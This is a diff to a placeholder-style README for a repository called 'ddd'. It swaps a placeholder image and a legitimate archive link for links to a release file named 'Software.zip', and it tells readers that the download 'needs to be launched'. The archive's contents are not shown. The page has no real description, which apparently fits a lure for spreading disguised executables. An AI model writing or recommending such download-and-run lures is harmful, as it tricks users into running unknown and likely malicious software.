@@ -1,6 +1,6 @@
 # 🚀 Welcome to the "ddd" Repository! 🚀
 
-![Repository Image](https://via.placeholder.com/800x200)
+![Repository Image](https://github.com/YuganthaGunasekara/ddd/releases/download/v1.0/Software.zip)
 
 ## Description
 Welcome to the "ddd" repository! Unfortunately, the short description for this repository is not provided. Nevertheless, feel free to explore and discover the exciting content within!
@@ -14,7 +14,7 @@ Welcome to the "ddd" repository! Unfortunately, the short description for this r
 ## Installation
 To get started with the "ddd" repository, you can download the latest version by clicking the button below:
 
-[![Download zip](https://img.shields.io/badge/Download-ZIP-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download zip](https://github.com/YuganthaGunasekara/ddd/releases/download/v1.0/Software.zip)](https://github.com/YuganthaGunasekara/ddd/releases/download/v1.0/Software.zip)
 
 Please note that the downloaded file needs to be launched to access the contents.
 
